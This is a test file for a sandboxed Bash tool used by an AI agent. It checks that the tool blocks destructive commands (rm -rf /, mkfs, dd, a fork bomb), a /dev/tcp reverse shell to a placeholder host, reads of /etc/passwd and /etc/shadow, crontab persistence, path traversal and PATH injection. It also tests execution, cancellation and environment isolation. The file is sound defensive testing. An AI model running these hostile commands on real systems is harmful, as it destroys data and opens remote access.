import { describe, expect, test } from "bun:test";
import { realpathSync } from "node:fs";
import { createBashTool } from "./bash-tool.js";
import { buildSafeEnv, SAFE_ENV } from "./exec.js";

// ---------------------------------------------------------------------------
// Unit tests — security blocking
// ---------------------------------------------------------------------------

describe("createBashTool — security blocking", () => {
  const tool = createBashTool({ workspaceRoot: "/workspace" });

  async function exec(
    command: string,
    opts?: { cwd?: string; timeoutMs?: number },
  ): Promise<Record<string, unknown>> {
    const result = await tool.execute({ command, ...opts }, {});
    return result as Record<string, unknown>;
  }

  test("blocks destructive rm -rf /", async () => {
    const result = await exec("rm -rf /");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("destructive");
    expect(typeof result.reason).toBe("string");
    expect(result.reason as string).toMatch(/unrecoverable/);
  });

  test("blocks destructive rm -rf /etc via session-granted Bash", async () => {
    // Simulates the exact issue #1721 scenario: the model has obtained a
    // session-wide Bash grant (via the TUI's `[a]` keystroke) and then
    // emits rm -rf /etc. Even with the permission gate cleared, the
    // bash-security classifier inside bash-tool.ts must still block.
    const result = await exec("rm -rf /etc");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("destructive");
  });

  test("blocks mkfs filesystem format", async () => {
    const result = await exec("mkfs.ext4 /dev/sda1");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("destructive");
  });

  test("blocks dd writing to a block device", async () => {
    const result = await exec("dd if=/dev/zero of=/dev/sda bs=1M");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("destructive");
  });

  test("blocks fork bomb", async () => {
    const result = await exec(":(){ :|:& };:");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("destructive");
  });

  test("blocks shutdown", async () => {
    const result = await exec("shutdown -h now");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("destructive");
  });

  test("allows workspace-scoped rm -rf /tmp/x (not destructive)", async () => {
    // This test proves the classifier is NOT over-aggressive on workspace
    // ops. rm -rf /tmp/x should reach the shell (though it may still fail
    // for other reasons like the cwd check). We only assert it's not
    // blocked with category=destructive.
    const result = await exec("rm -rf /tmp/koi-test-will-not-exist-9f8a7b6c");
    // result.category is only set when the command is blocked. For a
    // non-blocked command that actually executes, result.category is
    // undefined. If the command is blocked for some other reason (e.g.
    // cwd validation), it would not be "destructive".
    if (result.category !== undefined) {
      expect(result.category).not.toBe("destructive");
    }
  });

  test("blocks reverse shell via /dev/tcp", async () => {
    const result = await exec("bash -i >& /dev/tcp/attacker/4444 0>&1");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("reverse-shell");
  });

  test("blocks eval injection", async () => {
    const result = await exec("eval $(cat /etc/passwd)");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("injection");
  });

  test("blocks sudo privilege escalation", async () => {
    const result = await exec("sudo cat /etc/shadow");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("privilege-escalation");
  });

  test("blocks crontab persistence", async () => {
    const result = await exec("crontab -e");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("persistence");
  });

  test("blocks path traversal in cwd", async () => {
    const result = await exec("ls", { cwd: "../../etc" });
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("path-traversal");
  });

  test("blocks cwd escaping workspace root (when workspaceRoot is set)", async () => {
    const restricted = createBashTool({ workspaceRoot: "/workspace" });
    const result = (await restricted.execute({ command: "ls", cwd: "/etc" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("path-traversal");
  });

  test("blocks empty command", async () => {
    const result = await exec("   ");
    expect(result.error).toBeDefined();
  });

  test("spawn failure on non-existent cwd returns error, does not hang", async () => {
    // validatePath falls back to resolve() for paths that don't yet exist, so
    // a non-existent cwd passes path validation but fails at spawn time.
    // The 'error' handler on the child process must surface this as a blocked result.
    const restricted = createBashTool({ workspaceRoot: "/" }); // allow any cwd for this test
    const result = (await restricted.execute(
      { command: "echo hi", cwd: "/this/path/does/not/exist/koi-test" },
      {},
    )) as Record<string, unknown>;
    expect(result.error).toBeDefined();
    expect(typeof result.reason).toBe("string");
  });

  test("blocked result includes reason and pattern fields", async () => {
    const result = await exec("sudo whoami");
    expect(result.error).toBeDefined();
    expect(typeof result.reason).toBe("string");
    expect(typeof result.pattern).toBe("string");
    expect(typeof result.category).toBe("string");
  });

  describe("allowlist gate", () => {
    const restricted = createBashTool({
      policy: { allowlist: ["git ", "ls", "echo "] },
    });

    test("allows allowlisted command", async () => {
      const result = (await restricted.execute({ command: "git --version" }, {})) as Record<
        string,
        unknown
      >;
      // Should not be blocked (might fail if git not installed, but won't be a security block)
      if (typeof result.error === "string") {
        expect(result.category).not.toBe("injection"); // not blocked by allowlist
      }
    });

    test("blocks non-allowlisted command", async () => {
      const result = (await restricted.execute({ command: "cat README.md" }, {})) as Record<
        string,
        unknown
      >;
      expect(result.error).toMatch(/blocked/i);
    });
  });
});

// ---------------------------------------------------------------------------
// Integration tests — real subprocess execution
// ---------------------------------------------------------------------------

describe("createBashTool — integration (real subprocess)", () => {
  const tool = createBashTool();

  async function exec(
    command: string,
    opts?: { cwd?: string; timeoutMs?: number },
  ): Promise<Record<string, unknown>> {
    const result = await tool.execute({ command, ...opts }, {});
    return result as Record<string, unknown>;
  }

  test("executes simple echo command", async () => {
    const result = await exec("echo hello");
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("hello");
    expect(result.stderr).toBe("");
    expect(typeof result.durationMs).toBe("number");
  });

  test("captures stderr separately", async () => {
    const result = await exec("echo err >&2");
    expect(result.exitCode).toBe(0);
    expect(String(result.stderr).trim()).toBe("err");
  });

  test("returns non-zero exit code on command failure", async () => {
    // set -e means exit on error, but we capture the exit code
    const result = await exec("exit 42");
    expect(result.exitCode).toBe(42);
  });

  test("set -euo pipefail: fails on undefined variable", async () => {
    const result = await exec("echo $UNDEFINED_VAR_KOI_TEST");
    // With set -u, referencing an unset variable causes non-zero exit
    expect(result.exitCode).not.toBe(0);
  });

  test("multiline command executes correctly", async () => {
    const result = await exec("x=hello\necho $x");
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("hello");
  });

  test("cwd is used as working directory", async () => {
    // Use a subdirectory of process.cwd() so it stays within the default workspace root.
    // createBashTool() defaults workspaceRoot to process.cwd(); /tmp would be blocked.
    const subdir = realpathSync(process.cwd());
    const result = await exec("pwd", { cwd: subdir });
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe(subdir);
  });

  test("result includes durationMs", async () => {
    const result = await exec("echo test");
    expect(typeof result.durationMs).toBe("number");
    expect(result.durationMs as number).toBeGreaterThan(0);
  });

  test("env isolation: HOME and PATH are set", async () => {
    const result = await exec("echo $HOME $PATH");
    expect(result.exitCode).toBe(0);
    const stdout = String(result.stdout).trim();
    expect(stdout.length).toBeGreaterThan(0);
  });

  test("env isolation: env vars from test process do not leak into subprocess", async () => {
    process.env.KOI_BASH_TOOL_TEST_SENTINEL = "should-not-leak";
    // List all subprocess env vars — the sentinel must not appear
    const result = await exec("env");
    delete process.env.KOI_BASH_TOOL_TEST_SENTINEL;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout)).not.toContain("KOI_BASH_TOOL_TEST_SENTINEL");
  });
});

// ---------------------------------------------------------------------------
// Cancellation tests — AbortSignal + subprocess kill
// ---------------------------------------------------------------------------

describe("createBashTool — cancellation and timeout", () => {
  const tool = createBashTool();

  test("AbortSignal cancels running subprocess", async () => {
    const controller = new AbortController();
    const startTime = Date.now();

    // Start a 60-second sleep
    const execPromise = tool.execute({ command: "sleep 60" }, { signal: controller.signal });

    // Cancel after a short delay
    setTimeout(() => controller.abort(), 100);

    const result = (await execPromise) as Record<string, unknown>;
    const elapsed = Date.now() - startTime;

    // Should complete much faster than 60s
    expect(elapsed).toBeLessThan(5_000);
    // Subprocess should have been killed (non-zero exit)
    expect(result.exitCode).not.toBe(0);
  });

  test("timeoutMs kills subprocess after timeout", async () => {
    const startTime = Date.now();

    const result = (await tool.execute({ command: "sleep 60", timeoutMs: 200 }, {})) as Record<
      string,
      unknown
    >;

    const elapsed = Date.now() - startTime;
    expect(elapsed).toBeLessThan(5_000);
    expect(result.timedOut).toBe(true);
    expect(result.exitCode).not.toBe(0);
  });

  test("pre-aborted signal prevents spawn", async () => {
    const controller = new AbortController();
    controller.abort();

    await expect(
      tool.execute({ command: "echo should-not-run" }, { signal: controller.signal }),
    ).rejects.toBeDefined();
  });

  test("cancellation kills descendant processes (process group kill)", async () => {
    // Verify that child processes spawned by bash are also killed on cancellation.
    // Strategy: bash spawns a background 'sleep 1' that would write a marker file
    // after 500ms.  We cancel after 100ms.  After waiting 1s the marker must not exist,
    // proving the descendant was killed (not orphaned).
    const markerFile = `/tmp/koi-pgid-test-${Date.now()}.marker`;
    const controller = new AbortController();

    const execPromise = tool.execute(
      { command: `sleep 0.4 && touch ${markerFile} &\nwait` },
      { signal: controller.signal },
    );

    // Cancel before the background sleep would write the marker
    setTimeout(() => controller.abort(), 100);
    await execPromise.catch(() => {});

    // Wait longer than the sleep duration so the orphan would have written by now
    await new Promise((r) => setTimeout(r, 800));

    const { existsSync } = await import("node:fs");
    expect(existsSync(markerFile)).toBe(false);
  });

  test("subsequent execution works after cancellation", async () => {
    const controller = new AbortController();

    const cancelledExec = tool.execute({ command: "sleep 60" }, { signal: controller.signal });
    setTimeout(() => controller.abort(), 50);
    await cancelledExec.catch(() => {});

    // Should still work after a cancelled execution
    const result = (await tool.execute({ command: "echo still-works" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("still-works");
  });
});

// ---------------------------------------------------------------------------
// Output budgeting tests
// ---------------------------------------------------------------------------

describe("createBashTool — output budgeting", () => {
  test("truncates output exceeding maxOutputBytes", async () => {
    const tool = createBashTool({ policy: { maxOutputBytes: 100 } });

    // Generate output larger than 100 bytes
    const result = (await tool.execute(
      { command: "python3 -c \"print('x' * 200)\" 2>/dev/null || printf '%0.s x' {1..200}" },
      {},
    )) as Record<string, unknown>;

    if (result.truncated === true) {
      expect(result.truncatedNote).toMatch(/100 bytes/);
    }
    // Either truncated or the command failed — both acceptable
    expect(result.error).toBeUndefined();
  });

  test("does not set truncated for small output", async () => {
    const tool = createBashTool({ policy: { maxOutputBytes: 1_000_000 } });
    const result = (await tool.execute({ command: "echo small" }, {})) as Record<string, unknown>;
    expect(result.truncated).toBeUndefined();
    expect(result.exitCode).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Tool descriptor validation
// ---------------------------------------------------------------------------

describe("createBashTool — tool descriptor", () => {
  test("has correct descriptor shape", () => {
    const tool = createBashTool();
    expect(tool.descriptor.name).toBe("Bash");
    expect(typeof tool.descriptor.description).toBe("string");
    expect(tool.descriptor.description.length).toBeGreaterThan(0);
    expect(tool.origin).toBe("primordial");
  });

  test("input schema requires command field", () => {
    const schema = createBashTool().descriptor.inputSchema;
    expect((schema as Record<string, unknown>).required).toContain("command");
  });
});

// ---------------------------------------------------------------------------
// trackCwd feature tests — real subprocess (cwd sentinel + state persistence)
// ---------------------------------------------------------------------------

describe("createBashTool — trackCwd", () => {
  // Use process.cwd() as workspace root — always a valid, fully-resolved path
  // without macOS symlink surprises that would trip the security classifier.
  const workspaceRoot = realpathSync(process.cwd());

  test("cwd persists across calls after cd", async () => {
    const tool = createBashTool({ workspaceRoot, trackCwd: true });
    // Create a subdirectory to cd into (must be within workspaceRoot)
    const subdir = `${workspaceRoot}/koi-trackCwd-test-${Date.now()}`;
    await tool.execute({ command: `mkdir -p ${subdir}` }, {});

    // cd into the subdir
    const r1 = (await tool.execute({ command: `cd ${subdir}` }, {})) as Record<string, unknown>;
    expect(r1.exitCode).toBe(0);

    // Second call: pwd should reflect the subdir (cwd tracked)
    const r2 = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(r2.exitCode).toBe(0);
    expect(String(r2.stdout).trim()).toBe(subdir);

    // Cleanup
    await tool.execute({ command: `rmdir ${subdir}` }, {});
  });

  test("sentinel is stripped from returned stdout", async () => {
    const tool = createBashTool({ workspaceRoot, trackCwd: true });
    const result = (await tool.execute({ command: "echo hello" }, {})) as Record<string, unknown>;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout)).not.toContain("__KOI_CWD__");
    expect(String(result.stdout).trim()).toBe("hello");
  });

  test("cwd not updated when command fails", async () => {
    const tool = createBashTool({ workspaceRoot, trackCwd: true });
    const subdir = `${workspaceRoot}/koi-trackCwd-fail-${Date.now()}`;
    await tool.execute({ command: `mkdir -p ${subdir}` }, {});
    await tool.execute({ command: `cd ${subdir}` }, {});

    // Failing command — cwd should NOT change
    await tool.execute({ command: "exit 1" }, {});

    // Should still be in subdir
    const r = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(r.exitCode).toBe(0);
    expect(String(r.stdout).trim()).toBe(subdir);

    await tool.execute({ command: `rmdir ${subdir}` }, {});
  });

  test("explicit args.cwd overrides tracked cwd for that call", async () => {
    const tool = createBashTool({ workspaceRoot, trackCwd: true });
    const subA = `${workspaceRoot}/koi-cwdA-${Date.now()}`;
    const subB = `${workspaceRoot}/koi-cwdB-${Date.now()}`;
    await tool.execute({ command: `mkdir -p ${subA} ${subB}` }, {});

    // Track cwd to subA
    await tool.execute({ command: `cd ${subA}` }, {});

    // Override to subB for one call
    const r = (await tool.execute({ command: "pwd", cwd: subB }, {})) as Record<string, unknown>;
    expect(r.exitCode).toBe(0);
    expect(String(r.stdout).trim()).toBe(subB);

    // Tracked cwd should still be subA after the override
    const r2 = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(String(r2.stdout).trim()).toBe(subA);

    await tool.execute({ command: `rmdir ${subA} ${subB}` }, {});
  });

  test("without trackCwd, cwd does not persist", async () => {
    const tool = createBashTool({ workspaceRoot });
    const subdir = `${workspaceRoot}/koi-notrack-${Date.now()}`;
    await tool.execute({ command: `mkdir -p ${subdir}` }, {});
    await tool.execute({ command: `cd ${subdir}` }, {});
    // Next call should be back at workspaceRoot (not subdir)
    const r = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(r.exitCode).toBe(0);
    expect(String(r.stdout).trim()).toBe(workspaceRoot);
    await tool.execute({ command: `rmdir ${subdir}` }, {});
  });
});

// ---------------------------------------------------------------------------
// pathExtensions tests — regression for #1841
// ---------------------------------------------------------------------------

describe("buildSafeEnv", () => {
  test("returns SAFE_ENV unchanged when no extensions", () => {
    expect(buildSafeEnv({})).toBe(SAFE_ENV);
  });

  test("prepends extensions to default PATH", () => {
    const env = buildSafeEnv({
      pathExtensions: ["/opt/homebrew/bin", "/home/user/.bun/bin"],
    });
    const path = env.PATH ?? "";
    expect(path).toBe("/opt/homebrew/bin:/home/user/.bun/bin:/usr/local/bin:/usr/bin:/bin");
    expect(env.HOME).toBe(SAFE_ENV.HOME);
    expect(env.LANG).toBe(SAFE_ENV.LANG);
  });

  test("single extension prepended correctly", () => {
    const env = buildSafeEnv({ pathExtensions: ["/custom/path"] });
    const path = env.PATH ?? "";
    expect(path).toStartWith("/custom/path:");
    expect(path).toEndWith(SAFE_ENV.PATH ?? "");
  });

  test("overrides HOME when validated home provided", () => {
    const env = buildSafeEnv({ home: "/validated/home" });
    expect(env.HOME).toBe("/validated/home");
  });

  test("keeps safe HOME (/tmp) when no home provided", () => {
    const env = buildSafeEnv({ pathExtensions: ["/some/path"] });
    expect(env.HOME).toBe("/tmp");
  });

  test("rejects empty home value", () => {
    const env = buildSafeEnv({ home: "" });
    expect(env.HOME).toBe("/tmp");
  });

  test("rejects relative home value", () => {
    const env = buildSafeEnv({ home: "relative/home" });
    expect(env.HOME).toBe("/tmp");
  });

  test("SAFE_ENV.HOME is /tmp, not process.env.HOME", () => {
    // Regression: SAFE_ENV.HOME must be a neutral safe default, not
    // the parent process HOME, to prevent injected HOME from steering
    // subprocess config/credentials.
    expect(SAFE_ENV.HOME).toBe("/tmp");
  });

  test("rejects empty string entries (POSIX cwd injection)", () => {
    const env = buildSafeEnv({ pathExtensions: ["", "/valid/path", ""] });
    const path = env.PATH ?? "";
    expect(path).not.toContain("::");
    expect(path).toStartWith("/valid/path:");
  });

  test("rejects non-absolute paths", () => {
    const env = buildSafeEnv({
      pathExtensions: ["relative/path", "./local", "/valid/path"],
    });
    const path = env.PATH ?? "";
    expect(path).not.toContain("relative");
    expect(path).not.toContain("./local");
    expect(path).toStartWith("/valid/path:");
  });

  test("rejects entries containing colons (segment injection)", () => {
    const env = buildSafeEnv({
      pathExtensions: ["/safe/bin:/evil/bin", "/valid/path"],
    });
    const path = env.PATH ?? "";
    expect(path).not.toContain("/evil/bin");
    expect(path).toStartWith("/valid/path:");
  });

  test("returns SAFE_ENV when all entries are invalid", () => {
    expect(buildSafeEnv({ pathExtensions: ["", "relative", "/has:colon"] })).toBe(SAFE_ENV);
  });
});

describe("createBashTool — pathExtensions (#1841)", () => {
  test("subprocess sees extended PATH when pathExtensions provided", async () => {
    const tool = createBashTool({ pathExtensions: ["/opt/homebrew/bin", "/fake/path"] });
    const result = (await tool.execute({ command: "echo $PATH" }, {})) as Record<string, unknown>;
    expect(result.exitCode).toBe(0);
    const path = String(result.stdout).trim();
    expect(path).toContain("/opt/homebrew/bin");
    expect(path).toContain("/fake/path");
    expect(path).toContain("/usr/local/bin");
  });

  test("subprocess uses default PATH when no pathExtensions", async () => {
    const tool = createBashTool();
    const result = (await tool.execute({ command: "echo $PATH" }, {})) as Record<string, unknown>;
    expect(result.exitCode).toBe(0);
    const path = String(result.stdout).trim();
    expect(path).toBe("/usr/local/bin:/usr/bin:/bin");
  });

  test("env vars still do not leak with pathExtensions", async () => {
    process.env.KOI_PATH_EXT_SENTINEL = "should-not-leak";
    const tool = createBashTool({ pathExtensions: ["/opt/homebrew/bin"] });
    const result = (await tool.execute({ command: "env" }, {})) as Record<string, unknown>;
    delete process.env.KOI_PATH_EXT_SENTINEL;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout)).not.toContain("KOI_PATH_EXT_SENTINEL");
  });
});
